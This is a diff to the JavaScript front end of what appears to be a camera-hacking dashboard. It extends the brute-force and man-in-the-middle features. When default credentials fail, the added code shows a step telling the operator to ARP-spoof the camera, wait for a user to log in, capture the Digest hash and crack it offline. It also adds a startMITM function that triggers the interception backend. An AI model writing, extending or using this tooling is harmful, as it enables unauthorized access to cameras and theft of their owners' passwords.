@@ -421,12 +421,12 @@ function bruteForceCam() {
 function interceptCam() {
     if (!activeCam) return;
     const status = document.getElementById("creds-status");
-    status.textContent = "MITM active — open http://" + activeCam + " and log in...";
     status.style.color = "var(--yellow)";
+    status.innerHTML = `⏳ MITM active — open <a href="http://${activeCam}" target="_blank" style="color:var(--cyan)">http://${activeCam}</a> on any device and log in. Watch Activity Log.`;
     fetch("/api/camera/intercept/" + activeCam)
         .then(r => r.json())
-        .then(() => {
-            alert("Interceptor started!\n\nNow open http://" + activeCam + " in your browser and log in.\nThe hash will be captured and cracked automatically.\nWatch the Activity Log for results.");
+        .then(data => {
+            status.innerHTML = `⏳ Interceptor running — <strong>open <a href="http://${activeCam}" target="_blank" style="color:var(--cyan)">http://${activeCam}</a> and log in</strong> to capture hash`;
         });
 }
 
@@ -551,12 +551,39 @@ function cardBrute(ip) {
                         &nbsp;<button class="btn btn-sm btn-cyan" onclick="selectCameraWithCreds('${ip}','${data.username}','${data.password}')">📷 View</button>`;
                 }
             } else {
-                if (status) { status.textContent = "✗ No default creds — try 📷 View → 🕵️ Intercept"; status.style.color = "var(--red)"; }
+                // Default creds failed — show MITM option
+                if (status) { status.textContent = "✗ Custom password set — use MITM intercept below"; status.style.color = "var(--red)"; }
+                if (result) {
+                    result.style.display = "block";
+                    result.innerHTML = `
+                        <div style="color:var(--yellow);margin-bottom:8px">
+                            ⚠️ Camera has a custom password. Default credentials failed.<br>
+                            <small style="color:var(--text-dim)">
+                                Next step: ARP spoof the camera, wait for someone to log in,
+                                capture the Digest hash and crack it offline.
+                            </small>
+                        </div>
+                        <button class="btn btn-sm" style="border-color:var(--yellow);color:var(--yellow)" onclick="startMITM('${ip}')">🕵️ Start MITM Intercept</button>
+                        <span id="mitm-status-${ip}" style="font-size:0.75rem;margin-left:10px;color:var(--text-dim)"></span>`;
+                }
             }
         })
         .catch(() => {
             if (btn) { btn.disabled = false; btn.textContent = "🔓 Brute Force"; }
             if (status) { status.textContent = "✗ Request failed"; status.style.color = "var(--red)"; }
+        });
+}
+
+function startMITM(ip) {
+    const mitmStatus = document.getElementById("mitm-status-" + ip);
+    if (mitmStatus) { mitmStatus.textContent = "⏳ MITM active — open http://" + ip + " on any device and log in..."; mitmStatus.style.color = "var(--yellow)"; }
+
+    fetch("/api/camera/intercept/" + ip)
+        .then(r => r.json())
+        .then(() => {
+            if (mitmStatus) {
+                mitmStatus.innerHTML = `⏳ Interceptor running — <strong style="color:var(--cyan)">open <a href="http://${ip}" target="_blank" style="color:var(--cyan)">http://${ip}</a> on any device and log in</strong>. Watch Activity Log for cracked password.`;
+            }
         });
 }
 
